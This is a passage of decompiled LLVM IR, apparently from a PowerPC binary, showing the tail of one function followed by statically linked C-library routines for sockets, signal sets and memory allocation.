dec_label_pc_1000f358:                            ; preds = %dec_label_pc_1000f370.preheader, %dec_label_pc_1000f358.dec_label_pc_1000f358_crit_edge
  %v1_1000f36c = phi i32 [ %v2_1000f374, %dec_label_pc_1000f358.dec_label_pc_1000f358_crit_edge ], [ %v2_1000f3745, %dec_label_pc_1000f370.preheader ]
  %v0_1000f364 = phi i32 [ %v0_1000f364.pre, %dec_label_pc_1000f358.dec_label_pc_1000f358_crit_edge ], [ %v0_1000f330, %dec_label_pc_1000f370.preheader ]
  %v0_1000f35c = phi i32 [ %v0_1000f370, %dec_label_pc_1000f358.dec_label_pc_1000f358_crit_edge ], [ %v1_1000f338, %dec_label_pc_1000f370.preheader ]
  %v2_1000f35c = mul i32 %v0_1000f35c, %tmp19
  %v1_1000f360 = add i32 %v0_1000f35c, -1
  store i32 %v1_1000f360, i32* %r11.global-to-local, align 4
  %v2_1000f364 = add i32 %v0_1000f364, -8
  %v1_1000f368 = add i32 %v2_1000f364, %v2_1000f35c
  %v2_1000f36c = add i32 %v1_1000f36c, 4
  %v3_1000f36c = inttoptr i32 %v2_1000f36c to i32*
  store i32 %v1_1000f368, i32* %v3_1000f36c, align 4
  %v0_1000f370 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f370 = mul i32 %v0_1000f370, 4
  store i32 %v1_1000f370, i32* %r0.global-to-local, align 4
  %v1_1000f374 = load i32, i32* @r25, align 4
  %v0_1000f378 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f378 = add i32 %v0_1000f378, -1
  store i32 %v1_1000f378, i32* %ctr.global-to-local, align 4
  %v2_1000f378 = icmp eq i32 %v1_1000f378, 0
  br i1 %v2_1000f378, label %dec_label_pc_1000f37c, label %dec_label_pc_1000f358.dec_label_pc_1000f358_crit_edge

dec_label_pc_1000f358.dec_label_pc_1000f358_crit_edge: ; preds = %dec_label_pc_1000f358
  %v2_1000f374 = add i32 %v1_1000f374, %v1_1000f370
  %v0_1000f364.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000f358

dec_label_pc_1000f37c:                            ; preds = %dec_label_pc_1000f358, %dec_label_pc_1000f370.preheader
  %v1_1000f388 = phi i32 [ %v2_1000f330, %dec_label_pc_1000f370.preheader ], [ %v1_1000f374, %dec_label_pc_1000f358 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000f384 = mul i32 %v0_1000f2b8, 4
  %v2_1000f388 = add i32 %v1_1000f384, 4
  %v2_1000f38c = add i32 %v2_1000f388, %v1_1000f388
  %v3_1000f38c = inttoptr i32 %v2_1000f38c to i32*
  store i32 0, i32* %v3_1000f38c, align 4
  %v0_1000f398 = load i32, i32* @r25, align 4
  %v2_1000f398 = add i32 %v0_1000f398, %v1_1000f384
  store i32 %v2_1000f398, i32* %r11.global-to-local, align 4
  %v1_1000f39c = load i32, i32* @r31, align 4
  %v2_1000f39c = sub i32 %v1_1000f39c, %v2_1000f398
  %v1_1000f3a0 = add i32 %v2_1000f398, 8
  store i32 %v1_1000f3a0, i32* @r31, align 4
  %v0_1000f3a4 = load i32, i32* @r27, align 4
  %v2_1000f3a4 = add i32 %v0_1000f3a4, %v2_1000f39c
  %v1_1000f3a8 = add i32 %v2_1000f3a4, -8
  br label %dec_label_pc_1000f3ac

dec_label_pc_1000f3ac:                            ; preds = %dec_label_pc_1000f308.dec_label_pc_1000f3ac_crit_edge, %dec_label_pc_1000f37c
  %v0_1000f3b4 = phi i32 [ %v0_1000f3b4.pre, %dec_label_pc_1000f308.dec_label_pc_1000f3ac_crit_edge ], [ %v1_1000f3a0, %dec_label_pc_1000f37c ]
  %v0_1000f3b0 = phi i32 [ %v1_1000f2e4, %dec_label_pc_1000f308.dec_label_pc_1000f3ac_crit_edge ], [ %v1_1000f3a8, %dec_label_pc_1000f37c ]
  %v3_1000f3ac = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000f3ac, i32* @r4, align 4
  store i32 %v0_1000f3b4, i32* %r3.global-to-local, align 4
  store i32 268497852, i32* @lr, align 4
  %v3_1000f3b8 = call i32 @strncpy(i32 %v0_1000f3b4, i32 %v3_1000f3ac, i32 %v0_1000f3b0)
  %v3_1000f3bc = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000f3bc, i32* @r3, align 4
  store i32 268497860, i32* @lr, align 4
  %v0_1000f3c0 = call i32 @free()
  store i32 %v0_1000f3c0, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_1000f3c8 = icmp eq i32 %tmp18, 1
  br i1 %v3_1000f3c8, label %dec_label_pc_1000f3d0, label %dec_label_pc_1000f418

dec_label_pc_1000f3d0:                            ; preds = %dec_label_pc_1000f3ac
  store i32 4, i32* @r5, align 4
  %v0_1000f3d8 = load i32, i32* @r30, align 4
  store i32 %v0_1000f3d8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000f3e0.630 to i32), i32* @lr, align 4
  %v0_1000f3dc = call i32 @memcpy()
  %v1_1000f3e4 = load i32, i32* @r26, align 4
  %v2_1000f3e4 = add i32 %v1_1000f3e4, 8
  %v3_1000f3e4 = inttoptr i32 %v2_1000f3e4 to i32*
  store i32 2, i32* %v3_1000f3e4, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000f3ec = load i32, i32* @r26, align 4
  %v2_1000f3ec = add i32 %v1_1000f3ec, 12
  %v3_1000f3ec = inttoptr i32 %v2_1000f3ec to i32*
  store i32 4, i32* %v3_1000f3ec, align 4
  %v0_1000f3f0 = load i32, i32* @r31, align 4
  %v1_1000f3f0 = load i32, i32* @r26, align 4
  %v2_1000f3f0 = inttoptr i32 %v1_1000f3f0 to i32*
  store i32 %v0_1000f3f0, i32* %v2_1000f3f0, align 4
  %v0_1000f3f4 = load i32, i32* @r25, align 4
  %v1_1000f3f4 = load i32, i32* @r26, align 4
  %v2_1000f3f4 = add i32 %v1_1000f3f4, 16
  %v3_1000f3f4 = inttoptr i32 %v2_1000f3f4 to i32*
  store i32 %v0_1000f3f4, i32* %v3_1000f3f4, align 4
  %v0_1000f3f8 = load i32, i32* @r21, align 4
  %v1_1000f3f8 = load i32, i32* @r26, align 4
  %v2_1000f3f8 = add i32 %v1_1000f3f8, 4
  %v3_1000f3f8 = inttoptr i32 %v2_1000f3f8 to i32*
  store i32 %v0_1000f3f8, i32* %v3_1000f3f8, align 4
  %v3_1000f3fc = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000f3fc, i32* @r3, align 4
  store i32 268497924, i32* @lr, align 4
  %v0_1000f400 = call i32 @free()
  store i32 %v0_1000f400, i32* %r3.global-to-local, align 4
  %v0_1000f404 = load i32, i32* @r26, align 4
  %v1_1000f404 = load i32, i32* @r20, align 4
  %v2_1000f404 = inttoptr i32 %v1_1000f404 to i32*
  store i32 %v0_1000f404, i32* %v2_1000f404, align 4
  br label %dec_label_pc_1000f410

dec_label_pc_1000f410:                            ; preds = %dec_label_pc_1000f418, %dec_label_pc_1000f25c, %dec_label_pc_1000f3d0
  %storemerge1 = phi i32 [ 0, %dec_label_pc_1000f3d0 ], [ 2, %dec_label_pc_1000f25c ], [ 2, %dec_label_pc_1000f418 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_1000f3d0 ], [ 1, %dec_label_pc_1000f25c ], [ 1, %dec_label_pc_1000f418 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1000f410 = load i32, i32* @r24, align 4
  %v2_1000f410 = inttoptr i32 %v1_1000f410 to i32*
  store i32 %storemerge, i32* %v2_1000f410, align 4
  br label %dec_label_pc_1000f430

dec_label_pc_1000f418:                            ; preds = %dec_label_pc_1000f3ac
  %v3_1000f418 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000f418, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000f420.631 to i32), i32* @lr, align 4
  %v0_1000f41c = call i32 @free()
  store i32 %v0_1000f41c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f410

dec_label_pc_1000f42c:                            ; preds = %dec_label_pc_1000f1f0, %dec_label_pc_1000f1d4, %dec_label_pc_1000f1c8, %dec_label_pc_1000f1b8, %dec_label_pc_1000f1a8
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f430

dec_label_pc_1000f430:                            ; preds = %dec_label_pc_1000f18c, %dec_label_pc_1000f184, %dec_label_pc_1000f138, %entry, %dec_label_pc_1000f410, %dec_label_pc_1000f2ec, %dec_label_pc_1000f230, %dec_label_pc_1000f42c
  store i32 %v0_1000f104, i32* %r0.global-to-local, align 4
  %v0_1000f440 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000f440

; uselistorder directives
  uselistorder i32 %v0_1000f3b4, { 1, 0 }
  uselistorder i32 %v1_1000f384, { 1, 0 }
  uselistorder i32 %v1_1000f378, { 1, 0 }
  uselistorder i32 %v1_1000f370, { 1, 0 }
  uselistorder i32 %v0_1000f35c, { 1, 0 }
  uselistorder i32 %v1_1000f3703, { 1, 0 }
  uselistorder i32 %v1_1000f338, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000f330, { 1, 0, 2 }
  uselistorder i32 %v0_1000f2b8, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000f1fc, { 1, 0, 2 }
  uselistorder i32 %v0_1000f1b8.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1000f1a0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 20, 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 3, 4, 5, 6, 1, 9, 7, 8, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000f430, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000f410, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000f3ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000f358, { 1, 0 }
  uselistorder label %dec_label_pc_1000f1b8, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000f458 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268498024, i32* @lr, align 4
  %v2_1000f464 = call i32 @__socketcall(i32 3, i32 %v2_1000f458)
  ret i32 %v2_1000f464

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r5, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000f48c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268498076, i32* @lr, align 4
  %v2_1000f498 = call i32 @__socketcall(i32 6, i32 %v2_1000f48c)
  ret i32 %v2_1000f498

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000f4c0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268498136, i32* @lr, align 4
  %v2_1000f4d4 = call i32 @__socketcall(i32 15, i32 %v2_1000f4c0)
  ret i32 %v2_1000f4d4

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000f4fc = ptrtoint i32* %stack_var_-24 to i32
  store i32 268498192, i32* @lr, align 4
  %v2_1000f50c = call i32 @__socketcall(i32 10, i32 %v2_1000f4fc)
  ret i32 %v2_1000f50c

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000f534 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268498248, i32* @lr, align 4
  %v2_1000f544 = call i32 @__socketcall(i32 9, i32 %v2_1000f534)
  ret i32 %v2_1000f544

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000f56c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268498312, i32* @lr, align 4
  %v2_1000f584 = call i32 @__socketcall(i32 11, i32 %v2_1000f56c)
  ret i32 %v2_1000f584

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000f5ac = ptrtoint i32* %stack_var_-40 to i32
  store i32 268498372, i32* @lr, align 4
  %v2_1000f5c0 = call i32 @__socketcall(i32 14, i32 %v2_1000f5ac)
  ret i32 %v2_1000f5c0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000f5e8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268498424, i32* @lr, align 4
  %v2_1000f5f4 = call i32 @__socketcall(i32 1, i32 %v2_1000f5e8)
  ret i32 %v2_1000f5f4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 5, 4, 6, 0, 1, 3, 7, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1000f638, label %dec_label_pc_1000f624

dec_label_pc_1000f624:                            ; preds = %entry
  %v0_1000f624 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000f630 = inttoptr i32 %v0_1000f624 to i32*
  store i32 22, i32* %v2_1000f630, align 4
  %v0_1000f644.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f640

dec_label_pc_1000f638:                            ; preds = %entry
  %v0_1000f638 = call i32 @__sigaddset()
  store i32 %v0_1000f638, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f640

dec_label_pc_1000f640:                            ; preds = %dec_label_pc_1000f624, %dec_label_pc_1000f638
  %v0_1000f644 = phi i32 [ %v0_1000f644.pre, %dec_label_pc_1000f624 ], [ %v0_1000f638, %dec_label_pc_1000f638 ]
  ret i32 %v0_1000f644

; uselistorder directives
  uselistorder label %dec_label_pc_1000f640, { 1, 0 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268498540, i32* @lr, align 4
  %v3_1000f668 = call i32 @__GI_memset(i32 0, i32 128, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_1000f680 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_1000f680, label %dec_label_pc_1000f6ac, label %dec_label_pc_1000f69c

dec_label_pc_1000f69c:                            ; preds = %entry
  %tmp20 = icmp slt i32 %arg1, 1
  br i1 %tmp20, label %dec_label_pc_1000f6ac, label %dec_label_pc_1000f6a4

dec_label_pc_1000f6a4:                            ; preds = %dec_label_pc_1000f69c
  %tmp21 = icmp slt i32 %arg1, 65
  br i1 %tmp21, label %dec_label_pc_1000f6dc.lr.ph, label %dec_label_pc_1000f6ac

dec_label_pc_1000f6ac:                            ; preds = %dec_label_pc_1000f6a4, %dec_label_pc_1000f69c, %entry
  %v0_1000f6ac = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000f6b8 = inttoptr i32 %v0_1000f6ac to i32*
  store i32 22, i32* %v2_1000f6b8, align 4
  %v0_1000f74c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f748

dec_label_pc_1000f6dc.lr.ph:                      ; preds = %dec_label_pc_1000f6a4
  %v2_1000f6cc = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000f6cc, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000f6dc22 = add i32 %v2_1000f6cc, 128
  %v3_1000f6dc23 = inttoptr i32 %v2_1000f6dc22 to i32*
  store i32 0, i32* %v3_1000f6dc23, align 4
  %v0_1000f6e024 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f6e025 = add i32 %v0_1000f6e024, -1
  store i32 %v1_1000f6e025, i32* %r11.global-to-local, align 4
  %v1_1000f6e426 = mul i32 %v1_1000f6e025, 4
  %v1_1000f6e827 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000f6e828 = add i32 %v1_1000f6e827, %v1_1000f6e426
  store i32 %v2_1000f6e828, i32* %r9.global-to-local, align 4
  %v0_1000f6ec29 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f6ec30 = add i32 %v0_1000f6ec29, -1
  store i32 %v1_1000f6ec30, i32* %ctr.global-to-local, align 4
  %v2_1000f6ec31 = icmp eq i32 %v1_1000f6ec30, 0
  br i1 %v2_1000f6ec31, label %dec_label_pc_1000f6f0, label %dec_label_pc_1000f6dc.dec_label_pc_1000f6dc_crit_edge

dec_label_pc_1000f6dc.dec_label_pc_1000f6dc_crit_edge: ; preds = %dec_label_pc_1000f6dc.lr.ph, %dec_label_pc_1000f6dc.dec_label_pc_1000f6dc_crit_edge
  %v2_1000f6e832 = phi i32 [ %v2_1000f6e8, %dec_label_pc_1000f6dc.dec_label_pc_1000f6dc_crit_edge ], [ %v2_1000f6e828, %dec_label_pc_1000f6dc.lr.ph ]
  %v0_1000f6dc.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000f6dc = add i32 %v2_1000f6e832, 4
  %v3_1000f6dc = inttoptr i32 %v2_1000f6dc to i32*
  store i32 %v0_1000f6dc.pre, i32* %v3_1000f6dc, align 4
  %v0_1000f6e0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f6e0 = add i32 %v0_1000f6e0, -1
  store i32 %v1_1000f6e0, i32* %r11.global-to-local, align 4
  %v1_1000f6e4 = mul i32 %v1_1000f6e0, 4
  %v1_1000f6e8 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000f6e8 = add i32 %v1_1000f6e8, %v1_1000f6e4
  store i32 %v2_1000f6e8, i32* %r9.global-to-local, align 4
  %v0_1000f6ec = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f6ec = add i32 %v0_1000f6ec, -1
  store i32 %v1_1000f6ec, i32* %ctr.global-to-local, align 4
  %v2_1000f6ec = icmp eq i32 %v1_1000f6ec, 0
  br i1 %v2_1000f6ec, label %dec_label_pc_1000f6f0, label %dec_label_pc_1000f6dc.dec_label_pc_1000f6dc_crit_edge

dec_label_pc_1000f6f0:                            ; preds = %dec_label_pc_1000f6dc.dec_label_pc_1000f6dc_crit_edge, %dec_label_pc_1000f6dc.lr.ph
  %v0_1000f6f4.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_1000f6f0 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_1000f6f0, i32* @r3, align 4
  store i32 %v0_1000f6f4.pre, i32* @r4, align 4
  %v0_1000f6f8 = call i32 @__sigaddset()
  %v1_1000f6fc = icmp slt i32 %v0_1000f6f8, 0
  br i1 %v1_1000f6fc, label %dec_label_pc_1000f744, label %dec_label_pc_1000f704

dec_label_pc_1000f704:                            ; preds = %dec_label_pc_1000f6f0
  %v0_1000f708 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000f710 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_1002e870.634 to i32), i32 %v0_1000f708)
  %v2_1000f71c = ptrtoint i32* %stack_var_-156 to i32
  store i32 268498740, i32* @lr, align 4
  %v4_1000f730 = call i32 @__libc_sigaction(i32 %v0_1000f708, i32* nonnull %stack_var_-296, i32 %v2_1000f71c)
  %v1_1000f734 = icmp slt i32 %v4_1000f730, 0
  br i1 %v1_1000f734, label %dec_label_pc_1000f744, label %dec_label_pc_1000f73c

dec_label_pc_1000f73c:                            ; preds = %dec_label_pc_1000f704
  %v3_1000f73c = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_1000f73c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f748

dec_label_pc_1000f744:                            ; preds = %dec_label_pc_1000f704, %dec_label_pc_1000f6f0
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000f748

dec_label_pc_1000f748:                            ; preds = %dec_label_pc_1000f73c, %dec_label_pc_1000f6ac, %dec_label_pc_1000f744
  %v0_1000f74c = phi i32 [ %v3_1000f73c, %dec_label_pc_1000f73c ], [ %v0_1000f74c.pre, %dec_label_pc_1000f6ac ], [ -1, %dec_label_pc_1000f744 ]
  ret i32 %v0_1000f74c

; uselistorder directives
  uselistorder i32 %v1_1000f6ec, { 1, 0 }
  uselistorder i32 %v2_1000f6e8, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %ctr.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32 65, { 2, 3, 4, 0, 1 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000f748, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f6dc.dec_label_pc_1000f6dc_crit_edge, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000f760 = add i32 %arg2, -1
  %v1_1000f764 = call i32 @__asm_rlwinm(i32 %v1_1000f760, i32 29, i32 3, i32 29)
  %v1_1000f768 = urem i32 %v1_1000f760, 32
  %v2_1000f76c = add i32 %v1_1000f764, %arg1
  %v3_1000f76c = inttoptr i32 %v2_1000f76c to i32*
  %v4_1000f76c = load i32, i32* %v3_1000f76c, align 4
  %v3_1000f774 = shl i32 1, %v1_1000f768
  %v2_1000f778 = and i32 %v4_1000f76c, %v3_1000f774
  %v2_1000f77c = icmp ne i32 %v2_1000f778, 0
  %v5_1000f780 = zext i1 %v2_1000f77c to i32
  ret i32 %v5_1000f780
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000f788 = load i32, i32* @r4, align 4
  %v1_1000f788 = add i32 %v0_1000f788, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000f790 = call i32 @__asm_rlwinm(i32 %v1_1000f788, i32 29, i32 3, i32 29)
  %v1_1000f794 = urem i32 %v1_1000f788, 32
  %v1_1000f798 = load i32, i32* @r3, align 4
  %v2_1000f798 = add i32 %v1_1000f798, %v1_1000f790
  %v3_1000f798 = inttoptr i32 %v2_1000f798 to i32*
  %v4_1000f798 = load i32, i32* %v3_1000f798, align 4
  %v0_1000f79c = load i32, i32* %r0.global-to-local, align 4
  %v3_1000f79c = shl i32 %v0_1000f79c, %v1_1000f794
  store i32 %v3_1000f79c, i32* %r0.global-to-local, align 4
  %v2_1000f7a0 = or i32 %v3_1000f79c, %v4_1000f798
  store i32 %v2_1000f7a0, i32* %v3_1000f798, align 4
  ret i32 0
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000f7b0 = add i32 %arg2, -1
  %v1_1000f7b8 = call i32 @__asm_rlwinm(i32 %v1_1000f7b0, i32 29, i32 3, i32 29)
  %v1_1000f7bc = urem i32 %v1_1000f7b0, 32
  %v2_1000f7c0 = add i32 %v1_1000f7b8, %arg1
  %v3_1000f7c0 = inttoptr i32 %v2_1000f7c0 to i32*
  %v4_1000f7c0 = load i32, i32* %v3_1000f7c0, align 4
  %v3_1000f7c4 = shl i32 -2, %v1_1000f7bc
  %v4_1000f7c4 = sub nsw i32 32, %v1_1000f7bc
  %v5_1000f7c4 = lshr i32 -2, %v4_1000f7c4
  %v6_1000f7c4 = or i32 %v5_1000f7c4, %v3_1000f7c4
  %v2_1000f7c8 = and i32 %v6_1000f7c4, %v4_1000f7c0
  store i32 %v2_1000f7c8, i32* %v3_1000f7c0, align 4
  ret i32 0
}

define i32 @malloc() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000f7d8 = load i32, i32* @r3, align 4
  %v3_1000f7d8 = icmp eq i32 %v0_1000f7d8, 0
  br i1 %v3_1000f7d8, label %dec_label_pc_1000f7f0, label %dec_label_pc_1000f7f4

dec_label_pc_1000f7f0:                            ; preds = %entry
  br label %dec_label_pc_1000f7f4

dec_label_pc_1000f7f4:                            ; preds = %entry, %dec_label_pc_1000f7f0
  %v0_1000f804 = phi i32 [ 1, %dec_label_pc_1000f7f0 ], [ %v0_1000f7d8, %entry ]
  %v3_1000f7f8 = icmp ugt i32 %v0_1000f804, -8
  br i1 %v3_1000f7f8, label %dec_label_pc_1000f908, label %dec_label_pc_1000f800

dec_label_pc_1000f800:                            ; preds = %dec_label_pc_1000f7f4
  %v1_1000f804 = add i32 %v0_1000f804, 4
  store i32 ptrtoint (i32* @global_var_1002e840.635 to i32), i32* @r29, align 4
  store i32 %v1_1000f804, i32* %stack_var_-40, align 4
  %v0_1000f814 = call i32 @__pthread_return_0()
  %v2_1000f81c = ptrtoint i32* %stack_var_-40 to i32
  %v3_1000f824 = call i32 @__heap_alloc(i32* inttoptr (i32 268600736 to i32*), i32 %v2_1000f81c)
  store i32 %v3_1000f824, i32* %r31.global-to-local, align 4
  %v0_1000f830 = call i32 @__pthread_return_0()
  %v3_1000f834 = icmp eq i32 %v3_1000f824, 0
  br i1 %v3_1000f834, label %dec_label_pc_1000f83c, label %dec_label_pc_1000f8ec.thread

dec_label_pc_1000f8ec.thread:                     ; preds = %dec_label_pc_1000f800
  br label %dec_label_pc_1000f900

dec_label_pc_1000f83c:                            ; preds = %dec_label_pc_1000f800
  %v3_1000f840 = load i32, i32* @global_var_10028600.581, align 4
  store i32 %v3_1000f840, i32* %r31.global-to-local, align 4
  %v3_1000f844 = load i32, i32* %stack_var_-40, align 4
  %v2_1000f848 = icmp ult i32 %v3_1000f844, %v3_1000f840
  br i1 %v2_1000f848, label %dec_label_pc_1000f860, label %dec_label_pc_1000f850

dec_label_pc_1000f850:                            ; preds = %dec_label_pc_1000f83c
  %v1_1000f854 = sub i32 0, %v3_1000f840
  %v2_1000f850 = add i32 %v3_1000f840, -1
  %v1_1000f858 = add i32 %v2_1000f850, %v3_1000f844
  %v2_1000f85c = and i32 %v1_1000f858, %v1_1000f854
  store i32 %v2_1000f85c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000f860

dec_label_pc_1000f860:                            ; preds = %dec_label_pc_1000f83c, %dec_label_pc_1000f850
  %v0_1000f86c = call i32 @__pthread_return_0()
  %v0_1000f870 = load i32, i32* %r31.global-to-local, align 4
  store i32 268499064, i32* @lr, align 4
  %v1_1000f874 = call i32 @__GI_sbrk(i32 %v0_1000f870)
  %v3_1000f878 = icmp eq i32 %v1_1000f874, -1
  br i1 %v3_1000f878, label %dec_label_pc_1000f898, label %dec_label_pc_1000f880

dec_label_pc_1000f880:                            ; preds = %dec_label_pc_1000f860
  %v1_1000f880 = add i32 %v1_1000f874, 3
  %v1_1000f884 = call i32 @__asm_rlwinm(i32 %v1_1000f880, i32 0, i32 0, i32 29)
  store i32 %v1_1000f884, i32* @r30, align 4
  %v4_1000f888 = icmp eq i32 %v1_1000f884, %v1_1000f874
  br i1 %v4_1000f888, label %dec_label_pc_1000f898, label %dec_label_pc_1000f890

dec_label_pc_1000f890:                            ; preds = %dec_label_pc_1000f880
  %v2_1000f890 = sub i32 %v1_1000f884, %v1_1000f874
  store i32 268499096, i32* @lr, align 4
